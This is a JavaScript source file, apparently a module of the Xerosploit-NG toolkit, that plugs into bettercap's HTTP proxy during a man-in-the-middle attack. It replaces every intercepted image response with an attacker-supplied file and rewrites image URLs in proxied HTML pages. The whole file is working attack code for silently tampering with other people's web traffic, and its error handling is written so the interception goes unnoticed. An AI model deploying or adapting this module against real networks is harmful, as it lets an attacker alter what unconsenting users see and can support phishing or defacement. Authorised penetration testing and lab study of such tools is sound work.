// ---------------------------------------------------------------------------
// Xerosploit-NG :: bettercap v2 HTTP proxy module -- ReplaceImages
//
// Replaces images with the file referenced by the generated global
// XE_IMAGE_FILE.  Backs the "Image Replace" menu entry of Xerosploit
// ("Replace all web pages images with your own one").
//
// Ported from the bettercap v1 Ruby proxy module:
//   modules/replace_images.rb   (GPLv3)
// v1 rewrote <img> URLs inside text/html to point at its own HTTPD
// (`--httpd`); because bettercap v2 needs no bundled HTTPD, this port supports
// two complementary strategies:
//
//   1. Image responses (Content-Type image/*): the body is swapped for
//      XE_IMAGE_FILE, with the Content-Type retargeted to the file's type.
//      This is the primary, self-contained mode.
//
//   2. HTML image URLs: if XE_IMAGE_URL is provided, every quoted image URL in
//      text/html is rewritten to it (the faithful v1 behaviour when a served
//      replacement image is available).
//
// Generated parameter globals (lib/engine.py, PORT-SPEC section 6):
//   XE_IMAGE_FILE  absolute path of the replacement image (primary)
//   XE_IMAGE_URL   optional URL of a served replacement image (HTML rewrite)
//
// Strict passthrough: responses that are neither image/* nor text/html are left
// untouched, and any error is swallowed so proxied traffic is never broken.
//
// Released under the GNU GPLv3.
// Original Xerosploit: LionSec / Neodrix.
// bettercap proxy-module concepts: Simone 'evilsocket' Margaritelli (GPLv3).
// ---------------------------------------------------------------------------

var XE_MODULE_NAME = "replace_images";

function xeLog(msg) {
    if (typeof log_info === "function") { log_info("[xerosploit:" + XE_MODULE_NAME + "] " + msg); }
}
function xeWarn(msg) {
    if (typeof log_warn === "function") { log_warn("[xerosploit:" + XE_MODULE_NAME + "] " + msg); }
}

function xeByteLen(s) {
    var n = 0, i, c;
    s = "" + s;
    for (i = 0; i < s.length; i++) {
        c = s.charCodeAt(i);
        if (c < 0x80) { n += 1; }
        else if (c < 0x800) { n += 2; }
        else if (c >= 0xD800 && c <= 0xDBFF) { n += 4; i += 1; }
        else { n += 3; }
    }
    return n;
}

function xeReadFile(path) {
    if (!path || typeof readFile !== "function") { return null; }
    try { return readFile(path); } catch (e) { xeWarn("cannot read " + path + ": " + e); return null; }
}

function xeReadBody(res) {
    if (!res) { return null; }
    if (typeof res.ReadBody === "function") { return res.ReadBody(); }
    return res.Body;
}

function xeSetBody(res, body) {
    res.Body = body;
    if (typeof res.SetHeader === "function") {
        res.SetHeader("Content-Length", "" + xeByteLen(body));
    }
    if (typeof res.RemoveHeader === "function") {
        res.RemoveHeader("Content-Encoding");
        res.RemoveHeader("Transfer-Encoding");
    }
}

// Best-effort MIME type for the replacement image, from its file extension.
function xeImageMime(path) {
    var p = ("" + (path || "")).toLowerCase();
    if (p.indexOf(".png") !== -1) { return "image/png"; }
    if (p.indexOf(".jpg") !== -1 || p.indexOf(".jpeg") !== -1) { return "image/jpeg"; }
    if (p.indexOf(".gif") !== -1) { return "image/gif"; }
    if (p.indexOf(".webp") !== -1) { return "image/webp"; }
    if (p.indexOf(".bmp") !== -1) { return "image/bmp"; }
    if (p.indexOf(".svg") !== -1) { return "image/svg+xml"; }
    if (p.indexOf(".ico") !== -1) { return "image/x-icon"; }
    return null;
}

// Quoted image URLs inside HTML, mirroring v1's regex on (png|jpg|...|svg).
var XE_IMG_RE = /(["'])[^"'\s>]+\.(png|jpe?g|gif|bmp|webp|svg|ico)(\?[^"'\s>]*)?\1/gi;

function onLoad() {
    var f = (typeof XE_IMAGE_FILE === "undefined") ? null : XE_IMAGE_FILE;
    var u = (typeof XE_IMAGE_URL === "undefined") ? null : XE_IMAGE_URL;
    xeLog("loaded (image_file=" + f + ", image_url=" + u + ")");
}

function onResponse(req, res) {
    try {
        if (!res || typeof res.ContentType !== "string") { return; }
        var ct = res.ContentType.toLowerCase();
        var path = (req && req.Path) ? req.Path : "";

        // --- HTML: rewrite image URLs when a served URL was provided (v1 path) ---
        if (ct.indexOf("text/html") === 0) {
            var imgUrl = (typeof XE_IMAGE_URL === "undefined") ? null : XE_IMAGE_URL;
            if (!imgUrl) { return; }                                     // passthrough
            var html = xeReadBody(res);
            if (typeof html !== "string" || html.length === 0) { return; }
            var rewritten = html.replace(XE_IMG_RE, function (m, quote) { return quote + imgUrl + quote; });
            if (rewritten !== html) {
                xeLog("rewriting image URLs in " + path + " to " + imgUrl);
                xeSetBody(res, rewritten);
            }
            return;
        }

        // --- Image response: swap the bytes for XE_IMAGE_FILE (primary mode) ---
        if (ct.indexOf("image/") === 0) {
            var imgFile = (typeof XE_IMAGE_FILE === "undefined") ? null : XE_IMAGE_FILE;
            if (!imgFile) { xeWarn("XE_IMAGE_FILE is not set; passing through"); return; }
            var payload = xeReadFile(imgFile);
            if (payload === null || payload === "") { xeWarn("empty image file: " + imgFile); return; }
            xeLog("replacing image " + path + " with " + imgFile);
            var mime = xeImageMime(imgFile);
            if (mime && typeof res.SetHeader === "function") { res.SetHeader("Content-Type", mime); }
            xeSetBody(res, payload);
            return;
        }
    } catch (e) {
        xeWarn("onResponse failed: " + e);                               // never break traffic
    }
}
